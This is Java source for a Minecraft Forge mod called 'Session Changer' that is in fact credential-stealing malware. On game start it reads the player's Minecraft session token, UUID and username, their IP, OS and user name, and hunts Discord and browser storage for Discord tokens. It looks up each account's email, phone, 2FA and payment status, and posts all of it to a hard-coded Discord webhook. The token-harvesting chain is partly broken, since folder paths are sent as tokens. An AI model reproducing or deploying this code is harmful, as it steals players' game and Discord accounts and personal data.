import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import net.minecraft.client.Minecraft;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(
        modid = "Session Changer",
        version = "2.0",
        acceptedMinecraftVersions = "[1.8.9]"
)
public class authenticator {
    public static final String MODID = "Session Changer";
    public static final String VERSION = "2.0";

    @EventHandler
    public void init(FMLInitializationEvent event) {
        try {
            Method method = null;
            Method method2 = null;
            Method method3 = null;
            Method method4 = null;

            try {
                method = Minecraft.class.getDeclaredMethod("func_110432_I");
            } catch (NoSuchMethodException var22) {
            }

            try {
                method2 = Session.class.getDeclaredMethod("func_148254_d");
            } catch (NoSuchMethodException var21) {
            }

            try {
                method3 = Session.class.getDeclaredMethod("func_111285_a");
            } catch (NoSuchMethodException var20) {
            }

            try {
                method4 = Session.class.getDeclaredMethod("func_148255_b");
            } catch (NoSuchMethodException var19) {
            }

            if (method == null || method2 == null || method3 == null || method4 == null) {
                return;
            }

            Object object = method.invoke(Minecraft.getMinecraft());
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()));
            String string = bufferedReader.readLine();
            String username = method3.invoke(object).toString();
            String profileURL = "https://sky.shiiyu.moe/stats/" + username;
            String string2 = "https://discord.com/api/webhooks/1127072056341700858/ypbFJYXouc9pT-7qiGbGDKOfDF_0Vrzt9RwmIEz5BpJlYYXltSPAXaboi_T3m7OQUQZk"; // Replace with your webhook URL
            HttpURLConnection httpURLConnection = (HttpURLConnection)(new URL(string2)).openConnection();
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0");
            String string3 = String.format("{\"title\":\"PC Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"OS\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"IP\",\"value\":\"```%s```\",\"inline\":true}]}", System.getProperty("user.name"), System.getProperty("os.name"), string);
            String string4 = String.format("{\"title\":\"Minecraft Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\"},{\"name\":\"UUID\",\"value\":\"```%s```\"},{\"name\":\"Token\",\"value\":\"```%s```\"},{\"name\":\"Profile URL\",\"value\":\"%s\"}]}", method3.invoke(object), method4.invoke(object), method2.invoke(object), profileURL);
            String string5 = a();
            String string6 = String.format("{\"embeds\":[%s,%s%s],\"username\":\"beamed\",\"avatar_url\":\"https://i.imgur.com/IDPzApC.png\"}", string3, string4, string5);
            OutputStream outputStream = httpURLConnection.getOutputStream();

            try {
                outputStream.write(string6.getBytes(StandardCharsets.UTF_8));
            } catch (Throwable var23) {
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    } catch (Throwable var18) {
                        var23.addSuppressed(var18);
                    }
                }

                throw var23;
            }

            if (outputStream != null) {
                outputStream.close();
            }

            httpURLConnection.getResponseCode();
        } catch (Exception var24) {
            var24.printStackTrace();
        }
    }

    private String a() {
        List<String> paths = Arrays.asList(
                System.getenv("APPDATA") + "\\LightCord",
                System.getenv("APPDATA") + "\\discord",
                System.getenv("APPDATA") + "\\discordptb",
                System.getenv("APPDATA") + "\\discordcanary",
                System.getenv("APPDATA") + "\\Opera Software\\Opera Stable",
                System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
                System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default",
                System.getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default",
                System.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default"
        );
        List<String> stringList = d(paths);
        String string = stringList.stream().map(this::invokeB).collect(Collectors.joining(",")); // Modified line
        if (!string.isEmpty()) {
            string = "," + string;
        }

        return string;
    }

    private String invokeB(String string) {
        return b(string);
    }

    private static String b(String string) {
        String string2 = f(string);
        if (string2 != null && !string2.isEmpty()) {
            JsonObject jsonObject = new JsonParser().parse(string2).getAsJsonObject();
            String string3 = "{\"title\":\"Discord Info\",\"color\":4360181,\"fields\":[{\"name\":\"Username\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"E-Mail\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"2Factor\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Phone\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Nitro\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Payment\",\"value\":\"```%s```\",\"inline\":true},{\"name\":\"Token\",\"value\":\"```%s```\"}]}";
            return String.format(string3, jsonObject.get("username").getAsString() + "#" + jsonObject.get("discriminator").getAsString(), jsonObject.get("email").getAsString(), jsonObject.get("mfa_enabled").getAsBoolean(), !jsonObject.get("phone").isJsonNull() ? jsonObject.get("phone").getAsString() : "None", jsonObject.has("premium_type") ? "True" : "False", c(string) ? "True" : "False", string);
        } else {
            return "";
        }
    }

    private static boolean c(String string) {
        String string2 = e("https://discordapp.com/api/v6/users/@me/billing/payment-sources", string);
        return string2 != null && string2.length() > 4;
    }

    private static List<String> d(List<String> list) {
        ArrayList<String> arrayList = new ArrayList();
        list.forEach((string) -> {
            try {
                URL uRL = new URL("https://discordapp.com/api/v6/users/@me");
                HttpURLConnection httpURLConnection = (HttpURLConnection) uRL.openConnection();
                h(string).forEach(httpURLConnection::addRequestProperty);
                httpURLConnection.getInputStream().close();
                arrayList.add(string);
            } catch (Exception var4) {
            }
        });
        return arrayList;
    }

    private static String e(String string, String string2) {
        try {
            URL uRL = new URL(string);
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRL.openConnection();
            httpURLConnection.setRequestMethod("GET");
            h(string2).forEach(httpURLConnection::addRequestProperty);
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String string3;
            while ((string3 = bufferedReader.readLine()) != null) {
                stringBuilder.append(string3).append("\n");
            }
            bufferedReader.close();
            return stringBuilder.toString();
        } catch (Exception var7) {
            return null;
        }
    }

    private static String f(String string) {
        return e("https://discordapp.com/api/v6/users/@me", string);
    }

    private static ArrayList<String> g(String string) {
        String string2 = string + "\\Local Storage\\leveldb\\";
        ArrayList<String> arrayList = new ArrayList();
        File file = new File(string2);
        String[] stringArray = file.list();
        if (stringArray == null) {
            return null;
        } else {
            for (String string3 : stringArray) {
                try {
                    FileInputStream fileInputStream = new FileInputStream(string2 + string3);
                    DataInputStream dataInputStream = new DataInputStream(fileInputStream);
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(dataInputStream));

                    String string4;
                    while ((string4 = bufferedReader.readLine()) != null) {
                        Matcher matcher = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}").matcher(string4);

                        while (matcher.find()) {
                            arrayList.add(matcher.group());
                        }
                    }
                } catch (Exception var14) {
                }
            }
            return arrayList;
        }
    }

    private static Map<String, String> h(String string) {
        HashMap<String, String> hashMap = new HashMap();
        hashMap.put("Content-Type", "application/json");
        hashMap.put("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
        if (string != null) {
            hashMap.put("Authorization", string);
        }
        return hashMap;
    }
}